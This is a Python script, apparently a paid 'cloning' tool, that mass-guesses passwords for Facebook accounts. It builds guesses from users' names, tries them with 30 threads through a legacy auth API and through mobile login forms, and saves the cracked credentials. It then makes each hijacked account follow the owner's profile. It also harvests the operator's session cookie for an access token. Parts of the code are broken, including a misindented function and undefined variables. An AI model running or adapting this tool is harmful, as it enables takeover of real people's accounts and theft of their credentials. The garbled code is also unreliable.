#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6

### Import Module
import os
try:
    import requests
except ImportError:
    print('\n Module requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n Module futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n Module bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid
from concurrent.futures import ThreadPoolExecutor as BilalBSN
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  CHIGOZIEWORLDWIDE.  #
#------------------------------->

############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
###########################################################################################
done = False
def animate():
    os.system("clear")
    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
        if done:
            break
        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)
        sys.stdout.flush()
        time.sleep(0.03)
t = threading.Thread(target=animate)
t.start()
time.sleep(0.5)
done = True

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

# LO KONTOL
def logo():
	print("""%s
   8888888b.   .d8888b.  888    888 
888   Y88b d88P  Y88b 888    888 
888    888 Y88b.      888    888 
888   d88P  "Y888b.   8888888888 
8888888P"      "Y88b. 888    888 
888 T88b         "888 888    888 
888  T88b  Y88b  d88P 888    888 
888   T88b  "Y8888P"  888    888 
                                 
                                      
"""%(O))

def reg():
    os.system('clear')
    logo()
    print ('')
    print (' Checking Approval')
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.Saadat.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://github.com/AFG-Raziq/text/blob/main/T.Txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        os.system('clear')
        logo()
        print('')
        print ('\tApproved Not Detected')
        print ('')
        print (' \033[1;97mToken: ' + to)
        print(' WhatsApp : +93702856593')
        input('\033[1;97m Press Enter To Send Token')
        os.system('xdg-open https://wa.me/+93702856593?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
        reg()

def reg2():
    os.system('clear')
    logo()
    print('')
    print ('\tApproval Not Detected')
    print('')
    id = uuid.uuid4().hex[:50]
    print (' Token : ' + id)
    print(' WhatsApp : +93776811468')
    input(' Press Enter To Send Token ')
    os.system('xdg-open https://wa.me/+93702856593?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
    sav = open('/sdcard/Android/.Saadat.txt', 'w')
    sav.write(id)
    sav.close()
    reg()



#MASUK TOKEN
def chigozie():
    os.system('clear')
    print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
    cookie = input("\n %s[%s?%s] Cookies : %s"% (O,O,O,O))
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+923439635677');chigozie()
    try:
        head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': cookie}
        asww=requests.get("https://business.facebook.com/creatorstudio/home", headers=head)
        reqq=re.search('{"accessToken":"(EAA\w+)', asww.text)
        tokn=reqq.group(1)
        open('.cokie.txt', 'a').write(cookie)
        open('.token.txt', 'a').write(tokn)
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokn)).json()['name']
        print('\n\n %s*%s selamat datang %s%s%s'%(O,O,O,nama,O));time.sleep(2)
        print(' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,O));time.sleep(2)
        input(' %s*%s tekan enter '%(O,O))
        os.system('xdg-open https://wa.me/+93702856593')
        bsn_menu()
    except AttributeError:
        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
    except UnboundLocalError:
        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(O,O,O))
### ORANG GANTENG ###
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print('\n----------------------------------------------')
        print(' Your Process Complete...')
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mSaadat-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mSaadat-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
        input(f"\n\033[1;97m Press Enter To Go Back ")
        bsn_menu()

def bsn_menu():
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json() 
    IP = ipm["origin"]
    print(" [*]. CREATED BY |:-( Saadat )");time.sleep (0.03)
    print(" [*]. Tysm To My All Frendz. (Saadat)");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(" [*]. VERSION  3.0                                    ");time.sleep (0.03)   
    print(" [*]. WP             +93702856593      ");time.sleep (0.03)
    print(" [*]. This Tool was made in Saadat              ");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
    print(" [*] A N O N Y M O U S  D A R K F A T E  ( Saadat )    ");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
    print(".[*] This is a Premium Tool Bro                                 ");time.sleep (0.03)
    print(".[*] You need to buy this tool for 1 month membership                       ");time.sleep (0.03) 
    print(" [*] ---------------------------------------------");time.sleep(0.03)
    print(" [*] IP ADDRESS        [%s]\n"%(IP));time.sleep(0.01)
    print("   \033[1;97m              Menu")
    print("-----------------=\<------------------")
    print(" [1] File Cloning")
    print(" [2] Follow Owner")
    print(" [3] AFG Random")
    print(" [0] Exit")
    print("")
    pepek = input(' Select : ')
    if pepek in['1','01']:
        __bsn__().bilo(id)
            

class __bsn__:

    def __init__(self):
        self.id = ['3;03']

    def bilo(self,id):
        os.system('clear')
        logo()
        print("              file crack menu")
        print(' -------------------------------------------')
        print('')
        self.cnt = input('%s [+] file name :%s '%(A,F))
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        
        def inti(self,id):
        os.system('clear')
        logo()
        print("              AFG Random crack menu")
        print(' -------------------------------------------')
        print('')
        os.system('clear')
        logo()
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            os.system('clear')
            logo()
            print("              Method Menu")
            print('-------------------------------------------')
            print('')
            print(' [+] Method 1')
            print(' [+] Method 2')
            print(' [+] Method 3 (Best)')
            self.__pler__()
        else:
            print(' Choose Correct One');self.bilo(id)

    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [Saadat] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                print('\r [OK-Saadat] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
                break
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('Saadat-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('Mudassir-cp.txt' , 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [Saadat] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r{H} [OK-Saadat] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue

            loop+=1
        except:
            self.__metode__(user, pw, cebok)
#    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100065533669299",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text

    def __pler__(self):
        chi = ('3')
        if chi == '':
            print('\nSelect Correct One');self.__pler__()
        elif chi in ('1', '01'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        elif chi in ('3', '03'):

            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
                        else:
                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        else:
            print('\n Select Valid One');self.__pler__()


if __name__ == '__main__':
    reg()
